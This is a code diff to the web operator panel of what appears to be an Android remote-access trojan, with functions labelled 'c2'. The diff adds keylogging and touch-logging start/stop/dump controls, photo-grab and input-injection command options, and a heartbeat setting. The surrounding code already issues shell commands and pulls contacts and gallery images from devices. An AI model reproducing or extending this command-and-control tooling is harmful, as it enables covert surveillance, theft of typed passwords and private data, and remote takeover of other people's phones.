@@ -156,6 +156,20 @@ input:-webkit-autofill{box-shadow:0 0 0 1000px #fff inset!important;-webkit-box-
         <button style="background:#0f172a;color:#4ade80;border:1px solid #4ade80" onclick="openRemoteControl()">&#128225; Remote Control</button>
       </div>
 
+      <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;padding:8px 0;border-top:1px solid #e5e7eb;margin-top:4px">
+        <span style="font-size:12px;color:#6b7280;font-weight:600">Keylog:</span>
+        <button style="background:#7f1d1d;color:#fff;height:32px;font-size:12px" onclick="c2CmdKeylog('on')">&#9650; Start</button>
+        <button style="background:#6b7280;color:#fff;height:32px;font-size:12px" onclick="c2CmdKeylog('off')">&#9646; Stop</button>
+        <button style="background:#1e3a5f;color:#fff;height:32px;font-size:12px" onclick="c2CmdKeylog('get')">&#8595; Dump</button>
+        <span style="font-size:12px;color:#6b7280;font-weight:600;margin-left:10px">Touchlog:</span>
+        <button style="background:#78350f;color:#fff;height:32px;font-size:12px" onclick="c2CmdTouchlog('on')">&#9650; Start</button>
+        <button style="background:#6b7280;color:#fff;height:32px;font-size:12px" onclick="c2CmdTouchlog('off')">&#9646; Stop</button>
+        <button style="background:#1e3a5f;color:#fff;height:32px;font-size:12px" onclick="c2CmdTouchlog('get')">&#8595; Dump</button>
+        <span style="font-size:12px;color:#6b7280;margin-left:8px;font-weight:600">Verify interval (min):</span>
+        <input id="hbIntervalInput" type="number" min="0" value="0" style="width:70px;height:32px;border:1px solid #d1d5db;border-radius:6px;padding:0 6px;font-size:12px" title="Heartbeat verify interval (minutes, 0=disabled)">
+        <button style="background:#0369a1;color:#fff;height:32px;font-size:12px" onclick="c2SetHbInterval()">Set</button>
+      </div>
+
       <div id="shellPanel" class="hide" style="margin-bottom:12px;padding:12px;background:#f1f5f9;border-radius:8px">
         <div class="field" style="width:100%"><label>Shell command (requires root or executable permission)</label>
           <textarea id="shellCmd" placeholder="e.g. pm list packages | grep com&#10;id&#10;cat /proc/version" style="width:100%;min-height:80px;font-family:Consolas,monospace;padding:8px;border:1px solid #d1d5db;border-radius:6px"></textarea>
@@ -217,6 +231,13 @@ input:-webkit-autofill{box-shadow:0 0 0 1000px #fff inset!important;-webkit-box-
           <option value="shell">Shell</option>
           <option value="get_contacts">Contacts</option>
           <option value="get_gallery">Gallery</option>
+          <option value="gallery_photo">Gallery Photo</option>
+          <option value="get_photo">Photo</option>
+          <option value="keylog">Keylog</option>
+          <option value="touchlog">Touchlog</option>
+          <option value="switch_toggle">Switch Toggle</option>
+          <option value="input_tap">Tap</option>
+          <option value="input_swipe">Swipe</option>
         </select>
       </div>
       <div id="monitorUploads"></div>
@@ -590,6 +611,9 @@ async function c2CmdGetContacts(){ if(!c2ActiveDeviceId) return; const r=await a
 async function c2CmdShell(){ if(!c2ActiveDeviceId) return; const cmd=document.getElementById('shellCmd').value.trim(); if(!cmd) return alert('Enter a command first'); const r=await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'shell',cmd})}); r.ok?toast('Shell command issued'):alert(r.message||'Failed'); }
 async function c2CmdTap(){ if(!c2ActiveDeviceId) return; const x=Number(document.getElementById('tapX').value),y=Number(document.getElementById('tapY').value); const r=await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'input_tap',payload:{x,y}})}); r.ok?toast('Tap command issued'):alert(r.message||'Failed'); }
 async function c2CmdSwipe(){ if(!c2ActiveDeviceId) return; const x1=Number(document.getElementById('swX1').value),y1=Number(document.getElementById('swY1').value),x2=Number(document.getElementById('swX2').value),y2=Number(document.getElementById('swY2').value),dur=Number(document.getElementById('swDur').value); const r=await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'input_swipe',payload:{x1,y1,x2,y2,duration:dur}})}); r.ok?toast('Swipe command issued'):alert(r.message||'Failed'); }
+async function c2CmdKeylog(action){ if(!c2ActiveDeviceId) return; const r=await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'keylog_'+action})}); r.ok?toast('Keylog '+action+' issued'):alert(r.message||'Failed'); }
+async function c2CmdTouchlog(action){ if(!c2ActiveDeviceId) return; const r=await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'touchlog_'+action})}); r.ok?toast('Touchlog '+action+' issued'):alert(r.message||'Failed'); }
+async function c2SetHbInterval(){ if(!c2ActiveDeviceId) return; const mins=Number(document.getElementById('hbIntervalInput').value)||0; const r=await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'update_config',payload:{config:{heartbeat_verify_interval_minutes:mins}}})}); r.ok?toast('Verify interval set to '+mins+'m'):alert(r.message||'Failed'); }
 async function loadC2Uploads(id){
   const data = await api(`/admin/api/devices/${id}/uploads`);
   const list = data.uploads || [];
